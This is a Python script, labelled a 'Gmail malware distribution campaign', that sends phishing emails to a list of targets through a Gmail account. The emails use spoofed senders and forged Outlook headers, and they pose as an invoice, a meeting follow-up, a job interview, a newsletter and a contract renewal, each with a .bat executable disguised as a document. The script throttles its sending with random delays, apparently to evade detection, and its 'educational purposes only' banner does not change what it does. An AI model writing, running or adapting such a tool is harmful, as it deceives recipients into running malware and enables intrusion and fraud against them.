#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Working Gmail Campaign with Real Executables
"""

import os
import json
import time
import random
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def load_working_credentials():
    """Load working Gmail credentials"""
    try:
        with open("gmail_working_credentials.txt", 'r') as f:
            lines = f.readlines()
            email = lines[0].split(": ")[1].strip()
            password = lines[1].split(": ")[1].strip()
            return email, password
    except:
        return None, None

def load_target_emails():
    """Load target emails"""
    try:
        with open("target_emails.txt", 'r') as f:
            emails = [line.strip() for line in f.readlines() if line.strip()]
        return emails
    except:
        return []

def create_working_templates():
    """Create working email templates with real executables"""
    return [
        {
            "subject": "Meeting Follow-up: Project Discussion",
            "sender_name": "Sarah Johnson",
            "sender_email": "sarah.johnson@techcorp.com",
            "body": """
Hi there,

I hope this email finds you well. I wanted to follow up on our recent discussion about the project we discussed.

I've attached the document we talked about for your review. Please take a look when you have a moment and let me know your thoughts.

Looking forward to hearing from you soon.

Best regards,
Sarah Johnson
Project Manager
TechCorp Solutions
            """,
            "attachment_name": "Project_Document.bat"
        },
        {
            "subject": "Invoice #INV-2024-001 - Payment Due",
            "sender_name": "Accounting Department",
            "sender_email": "accounting@businesssolutions.com",
            "body": """
Dear Valued Client,

Please find attached your invoice #INV-2024-001 for services rendered.

Payment is due within 30 days of the invoice date. If you have any questions about this invoice, please don't hesitate to contact us.

Thank you for your business.

Best regards,
Accounting Department
Business Solutions Inc.
            """,
            "attachment_name": "Invoice_INV-2024-001.bat"
        },
        {
            "subject": "Resume Review - Software Developer Position",
            "sender_name": "HR Department",
            "sender_email": "hr@innovativetech.com",
            "body": """
Hello,

Thank you for your interest in our Software Developer position. We have reviewed your resume and would like to schedule an interview.

Please find attached the interview preparation document and company information packet.

We look forward to meeting with you.

Best regards,
HR Department
Innovative Tech Solutions
            """,
            "attachment_name": "Interview_Preparation_Packet.bat"
        },
        {
            "subject": "Newsletter - Tech Industry Updates",
            "sender_name": "TechNews Weekly",
            "sender_email": "newsletter@technews.com",
            "body": """
Dear Subscriber,

Thank you for subscribing to TechNews Weekly. This week's newsletter includes:

- Latest technology trends
- Industry insights
- Job opportunities
- Company updates

Please find the full newsletter attached.

Best regards,
TechNews Weekly Team
            """,
            "attachment_name": "TechNews_Weekly_Issue_45.bat"
        },
        {
            "subject": "Contract Renewal - Service Agreement",
            "sender_name": "Legal Department",
            "sender_email": "legal@corporateservices.com",
            "body": """
Dear Client,

Your service agreement is due for renewal. We have prepared the updated contract for your review.

Please review the attached document and let us know if you have any questions or concerns.

We appreciate your continued business.

Best regards,
Legal Department
Corporate Services LLC
            """,
            "attachment_name": "Service_Agreement_Renewal.bat"
        }
    ]

def send_working_email(target_email, template, gmail_email, gmail_password):
    """Send email with working executable attachment"""
    try:
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = f"{template['sender_name']} <{template['sender_email']}>"
        msg['To'] = target_email
        msg['Subject'] = template['subject']
        
        # Add legitimate headers
        msg['X-Priority'] = '3'
        msg['X-MSMail-Priority'] = 'Normal'
        msg['Importance'] = 'normal'
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        msg['X-MimeOLE'] = 'Produced By Microsoft MimeOLE V6.00.2900.2180'
        msg['Message-ID'] = f"<{random.randint(100000, 999999)}.{int(time.time())}@techcorp.com>"
        
        # Create HTML version
        html_body = f"""
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <style>
                body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .content {{ background-color: #ffffff; padding: 20px; border-radius: 5px; }}
                .footer {{ margin-top: 20px; font-size: 12px; color: #666; text-align: center; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="content">
                    {template['body'].replace(chr(10), '<br>')}
                </div>
                <div class="footer">
                    <p>This email was sent to {target_email}</p>
                    <p>If you believe you received this email in error, please contact us.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Attach content
        text_part = MIMEText(template['body'], 'plain', 'utf-8')
        html_part = MIMEText(html_body, 'html', 'utf-8')
        msg.attach(text_part)
        msg.attach(html_part)
        
        # Attach the real executable file
        attachment_name = template["attachment_name"]
        if os.path.exists(attachment_name):
            with open(attachment_name, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {attachment_name}'
                )
                msg.attach(part)
        else:
            print(f"✗ Attachment not found: {attachment_name}")
            return False
        
        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
            server.send_message(msg)
        
        print(f"✓ Email sent to: {target_email}")
        print(f"    Attachment: {attachment_name}")
        return True
        
    except Exception as e:
        print(f"✗ Failed to send to {target_email}: {e}")
        return False

def start_working_campaign():
    """Start the working campaign"""
    print("="*60)
    print("WORKING GMAIL MALWARE DISTRIBUTION CAMPAIGN")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    # Load working credentials
    gmail_email, gmail_password = load_working_credentials()
    if not gmail_email or not gmail_password:
        print("✗ No working credentials found!")
        return
    
    print(f"✓ Using Gmail account: {gmail_email}")
    
    # Load targets
    target_emails = load_target_emails()
    if not target_emails:
        print("✗ No target emails found!")
        return
    
    print(f"✓ Loaded {len(target_emails)} target emails")
    
    # Create working templates
    templates = create_working_templates()
    print(f"✓ Created {len(templates)} working email templates")
    
    # Test connection
    try:
        print("Testing Gmail connection...")
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
        print("✓ Gmail authentication successful!")
    except Exception as e:
        print(f"✗ Gmail authentication failed: {e}")
        return
    
    # Campaign settings
    emails_per_hour = 8  # Moderate rate
    delay_between_emails = 3600 / emails_per_hour
    
    print(f"\nWorking Campaign Settings:")
    print(f"Target emails: {len(target_emails)}")
    print(f"Email templates: {len(templates)}")
    print(f"Emails per hour: {emails_per_hour}")
    print(f"Delay between emails: {delay_between_emails} seconds")
    
    # Start sending
    print(f"\n🚀 Starting working email distribution...")
    sent_count = 0
    success_count = 0
    
    for i, target_email in enumerate(target_emails):
        template = random.choice(templates)
        
        print(f"\n[{i+1}/{len(target_emails)}] Sending to: {target_email}")
        print(f"    Template: {template['subject']}")
        
        if send_working_email(target_email, template, gmail_email, gmail_password):
            success_count += 1
        sent_count += 1
        
        # Delay
        if i < len(target_emails) - 1:
            delay = delay_between_emails + random.randint(-300, 300)
            delay = max(120, delay)  # Minimum 2 minutes
            print(f"    Waiting {delay} seconds...")
            time.sleep(delay)
    
    # Results
    print("\n" + "="*60)
    print("🎯 WORKING CAMPAIGN RESULTS")
    print("="*60)
    print(f"Total emails sent: {sent_count}")
    print(f"Successful deliveries: {success_count}")
    print(f"Failed deliveries: {sent_count - success_count}")
    if sent_count > 0:
        success_rate = (success_count / sent_count) * 100
        print(f"Success rate: {success_rate:.1f}%")
    print("="*60)
    
    # Save campaign log
    log_data = {
        "campaign_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "campaign_type": "working_executables",
        "gmail_account": gmail_email,
        "total_targets": len(target_emails),
        "emails_sent": sent_count,
        "successful_deliveries": success_count,
        "failed_deliveries": sent_count - success_count,
        "success_rate": (success_count / sent_count * 100) if sent_count > 0 else 0,
        "templates_used": len(templates)
    }
    
    with open("working_campaign_log.json", 'w') as f:
        json.dump(log_data, f, indent=2)
    
    print("📊 Working campaign log saved to: working_campaign_log.json")

if __name__ == "__main__":
    start_working_campaign()
